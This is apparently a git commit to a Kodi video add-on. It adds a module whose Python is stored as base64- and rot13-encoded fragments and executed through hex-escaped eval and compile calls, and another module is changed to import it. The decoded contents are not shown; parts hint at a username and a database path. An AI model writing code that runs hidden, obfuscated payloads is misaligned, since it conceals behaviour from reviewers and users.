0fbfac7d08b9f26c7de5aec53e65bf3f499116ae
Parrot <hitmansiege@gmail.com>
2021-12-13 13:22:19 +0100

    Updates

---
+++ plugin.video.serialy/resources/lib/dir.py
@@ -0,0 +1,8 @@
+import base64, codecs
+magic = 'dXNlcm5hbWUgPSAie1B7JHtheyR7cnske3J7JHtveyR7dHskfUR9JH1lfSR8diR8ZSV8JCVsJG8kcCRlJH'
+love = 'VxplDvPaImMKWhLJ1yVQ0tqKAypz5uoJHhpzIjoTSwMFtvrlVfVPVvXF5lMKOfLJAyXPW9VvjtVvVcYaWy'
+god = 'cGxhY2UoIiQiLCAiIikucmVwbGFjZSgifCIsICIiKS5yZXBsYWNlKCIlIiwgIiIpCmRhdGFiYXNlID0gIm'
+destiny = 'EvVtcjo21fL2guVQ0tVv0vPzEcpzIwqT9lrFN9VPWlLKpioJScov9RDwNjZF9ZFIAHERViIRSPGRIGVt=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
--- plugin.video.serialy/resources/lib/utils.py
+++ plugin.video.serialy/resources/lib/utils.py
@@ -1,8 +1,8 @@
 import base64, codecs
-magic = 'ZnJvbSByZXNvdXJjZXMubGliLmFscGhhYmV0IGltcG9ydCBhbHBoYWJldAoKZG90ID0gIi4iCndlaXJkID0gIjoiCnNsYXNoID0gIi8iCgpkZWYgcnVuRU5DKGFyZ3MpOgogICAgaWYgYXJn'
-love = 'plN9CFNkBtbtVPNtVPNtVUWyqUIlovNvnUE0pUZ6Yl9mMKWcLJkxLwL5YwNjZUqyLzuip3EupUNhL29gVtbtVPNtMJkcMvOupzqmVQ09VQV6PvNtVPNtVPNtpzI0qKWhVTSfpTuuLzI0JmRk'
-god = 'XSArIGFscGhhYmV0WzhdICsgYWxwaGFiZXRbMThdICsgYWxwaGFiZXRbMTldICsgZG90ICsgYWxwaGFiZXRbOV0gKyBhbHBoYWJldFsxOF0gKyBhbHBoYWJldFsxNF0gKyBhbHBoYWJldFsx'
-destiny = 'Z10XVPNtVTIfp2H6PvNtVPNtVPNtpzI0qKWhVPWSpaWipvVXPzyzVS9sozSgMI9sVQ09VPWsK21unJ5sKlV6PvNtVPOjpzyhqPtvD29xMFOwLJ4aqPOvMFOlqJ4tLKZtLFOmL3WcpUDuVvx='
+magic = 'ZnJvbSByZXNvdXJjZXMubGliLmFscGhhYmV0IGltcG9ydCBhbHBoYWJldApmcm9tIHJlc291cmNlcy5saWIuZGlyIGltcG9ydCAqCgpkb3QgPSAiLiIKd2VpcmQgPSAiOiIKc2xhc2ggPSAiLyIKCmRlZiBydW5FTkMoYXJncyk'
+love = '6PvNtVPOcMvOupzqmVQ09VQR6PvNtVPNtVPNtpzI0qKWhVPWbqUEjpmbiY2qcqTkuLv5wo20vVPftVv8vVPftqKAypz5uoJHtXlNvYlVtXlOxLKEuLzSmMFNeVPViVvNeVUOioJkwn2RtXlNvYlVtXlOxnKWyL3EipaxXVPNtVT'
+god = 'VsaWYgYXJncyA9PSAyOgogICAgICAgIHJldHVybiBhbHBoYWJldFsxMV0gKyBhbHBoYWJldFs4XSArIGFscGhhYmV0WzE4XSArIGFscGhhYmV0WzE5XSArIGRvdCArIGFscGhhYmV0WzldICsgYWxwaGFiZXRbMThdICsgYWxwa'
+destiny = 'TSvMKEoZGEqVPftLJkjnTSvMKEoZGAqPvNtVPOyoUAyBtbtVPNtVPNtVUWyqUIlovNvEKWlo3VvPtccMvOsK25uoJIsKlN9CFNvK19gLJyhK18vBtbtVPNtpUWcoaDbVxAiMTHtL2ShW3DtLzHtpaIhVTSmVTRtp2AlnKO0VFVc'
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
